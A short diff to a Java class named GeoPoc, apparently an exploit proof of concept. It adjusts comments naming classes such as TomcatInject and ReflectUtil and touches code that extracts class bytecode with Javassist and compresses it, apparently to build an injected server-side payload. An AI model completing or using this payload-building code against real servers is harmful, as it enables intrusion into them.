@@ -23,9 +23,9 @@ public class GeoPoc {
          * FRain
          * IFRain
          *
-         * KpLi0rn2
+         * org.junit.ma.KpLi0rn2
          * xxx
-         * ReflectUtil
+         * com.example.demo.Static.ReflectUtil
          *
          * Step1
          * TomcatInject
@@ -34,6 +34,8 @@ public class GeoPoc {
          */
         ClassPool classPool = ClassPool.getDefault();
         CtClass ctClass = classPool.getCtClass("com.example.demo.Static.ReflectUtil");
+        // 修改类名，去除包信息
+        //ctClass.setName("KpLi0rn2");
         byte[] bytes = ctClass.toBytecode();
 
         // GZIP压缩
